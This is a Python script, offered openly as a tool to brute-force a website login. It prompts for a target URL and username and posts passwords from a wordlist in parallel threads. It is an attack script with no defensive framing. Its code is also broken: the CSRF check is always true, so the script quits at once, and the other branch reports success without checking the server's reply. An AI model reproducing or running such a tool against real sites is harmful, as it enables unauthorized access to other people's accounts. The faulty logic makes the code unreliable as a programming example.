import threading
import requests
import time
import sys

print ("Brute force to crack a website password:")

class BruteForceCracker:
    def __init__(self, url, username):
        self.url = url
        self.username = username

    def crack(self, password):
        apply = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=apply)
        if "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Detected!! Bruteforce will not work on this website.")
            sys.exit()
        else:
            print("Username: " + self.username)
            print("Password: " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    cracker = BruteForceCracker(url, username)
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    main()